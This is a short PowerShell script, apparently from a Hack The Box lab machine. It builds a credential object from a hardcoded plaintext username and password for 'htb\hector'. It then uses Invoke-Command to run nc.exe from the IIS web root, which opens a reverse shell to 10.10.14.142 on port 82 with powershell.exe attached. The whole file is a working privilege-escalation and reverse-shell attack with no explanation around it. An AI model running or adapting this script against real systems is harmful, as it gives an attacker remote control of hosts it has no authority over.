$username = 'htb\hector'
$password = 'l33th4x0rhector'

$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
echo 'test ok'
invoke-command -computername localhost -credential $credential -scriptblock { c:\inetpub\wwwroot\nc.exe 10.10.14.142 82 -e powershell.exe } 
